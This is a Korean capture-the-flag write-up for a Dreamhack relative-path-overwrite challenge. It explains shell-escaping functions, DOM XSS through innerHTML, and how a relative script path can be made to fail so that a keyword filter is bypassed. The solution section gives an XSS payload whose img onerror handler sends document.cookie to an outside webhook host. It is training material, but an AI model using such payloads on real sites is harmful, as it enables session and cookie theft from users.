# Challenge: dreamhack - Relative-Path-Overwrite

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/439/



## 추가학습
### escapeshellcmd와 escapeshellarg
* escapeshellcmd()는 명령어 전체를 안전하게 만들어준다. 명령어에 특수 문자(;, |, &, >, <) 등이 들어가서 쉘 명령어가 변조되는 것을 막는다.
* escapeshellarg()는 명령어의 파라미터를 안전하게 만들어준다. 공백, 따옴표, 특수문자가 들어가도 하나의 인자로 인식되게 만드는 역할을 한다. 

### 일반 XSS vs DOM XSS
* 일반 XSS(Stored/Reflected)는 서버에서 클라이언트로 내려오는 HTTP 응답 안에 공격자가 넣은 스크립트가 포함된다. 즉, 공격자가 악성 스크립트를 입력해 서버로 전송되면 서버가 그대로 응답 HTML에 넣어 브라우저에 전송한다. 브라우저가 응답을 랜더링하면서 악성 코드가 실행된다. 서버 응답 단계에서 이미 스크립트가 HTML에 박혀있다.
* DOM XSS는 클라이언트(브라우저)에서 발생한다. 서버가 준 응답 자체는 안전하지만 브라우저 내 자바스크립트 코드에서 동적으로 DOM 조작하는 과정에서 공격자가 넣은 코드가 실행되는 경우이다. 
    * element.innerHTML에서 innerHTML은 문자열을 HTML로 해석하여 DOM에 삽입하는 API이다. 만약 innerHTML에 사용자가 입력한 문자열을 그대로 넣으면, DOM XSS 공격이 가능하다.

### URL 구조와 GET 파라미터
* 표준적으로 /index.php?page=vuln 처럼 파일명 뒤에 바로 ?가 붙는 것이 일반적이다. 하지만 /index.php/?page=vuln 처럼 파일명 뒤에 "/"가 붙고 그 뒤에 ?가 와도 웹서버(Apache, nginx 등)은 /index.php/를 index.php 파일에 대한 요청으로 인식하고 ?page=... 부분을 GET 파라미터로 정상적으로 처리한다.


## 문제 풀이
step 1 - 코드 분석
* 플래그를 얻기 위해서는 bot.py가 실행되어 read_url 함수가 실행되어야 한다. 그 이후에 document.cookie를 얻어내야 한다.
* body.py를 실행하는 코드는 report.php에 있다.
* report.php를 보자. 아래와 같은 php 코드가 있다. 사용자가 입력한 path 값을 받아서 base64 인코딩한 후 "python3 /bot.py 인코딩된path" 명령어를 생성한다. escapeshellcmd와 escapeshellarg로 안전하게 처리하고 명령어를 실행한다. 이는 Command Injection 공격을 방지한 코드이다.
    ```php
    <?php
    if(isset($_POST['path'])){
        exec(escapeshellcmd("python3 /bot.py " . escapeshellarg(base64_encode($_POST['path']))) . " 2>/dev/null &", $output);
        echo($output[0]);
    }
    ?>
    ```
* report.php의 path 부분에 특정 페이로드를 입력해 공격을 수행하는 방향인 듯하다. 어떻게 이용할 수 있을까? vuln.php 코드를 보자. 상대주소 filter.js의 내용인 var filter = ["script", "on", "frame", "object"]; 를 불러오고 param의 값에서 필터링을 거친다는 것을 알 수 있다. 그리고 innerHTML을 사용하고 있다. innerHTML이 script 태그의 실행은 허용하지 않으니 img src를 쓰는 방향으로 가자.
    ```php
    <script src="filter.js"></script>
    <pre id=param></pre>
    <script>
        var param_elem = document.getElementById("param");
        var url = new URL(window.location.href);
        var param = url.searchParams.get("param");
        if (typeof filter !== 'undefined') {
            for (var i = 0; i < filter.length; i++) {
                if (param.toLowerCase().includes(filter[i])) {
                    param = "nope !!";
                    break;
                }
            }
        }
        param_elem.innerHTML = param;
    </script>
    ```

step 2 - 취약점 분석 및 페이로드 작성
* 중요한 것은 filter.js가 상대주소로 로드된다는 것이다. 즉 RPO를 이용해 브라우저와 서버가 인식하는 경로를 다르게 만든 후 vuln.php에 접속하면 filter 변수가 정의되지 않게 할 수 있다.
* /report 폼에 index.php/?page=vuln&param=<img src="" onerror=location.href="https://cknlxec.request.dreamhack.games/"%2bdocument.cookie>를 입력하자. 
* 위 페이로드를 입력하면 서버는 /index.php를 실행하고 내부적으로 include $page;를 통해 vuln.php의 코드를 실행해 HTML을 생성한다. 응답에는 <script src="filter.js"></script>와 같은 코드가 포함된다. 
* 관리자 봇 브라우저는 HTML을 받아 화면에 출력한다. HTML 코드에서 ```<script src="filter.js"></script>```와 같은 상대 경로를 만나 filter.js를 로드하려고 시도한다. 브라우저는 현재 URL 기준으로 상대 경로를 해석한다. 따라서 잘못 된 경로인 /index.php/filter.js에서 찾으려하다 실패한다. 이로 인해 filter 변수가 정의되지 않아  필터링이 비활성화되고, XSS 공격이 성공한다.

## 결과
```
index.php/?page=vuln&param=<img src="" onerror=location.href="https://ifsvhpm.request.dreamhack.games/"%2bdocument.cookie>
```
위 페이로드를 /report에 입력해 웹훅 사이트에서 플래그를 얻을 수 있다.
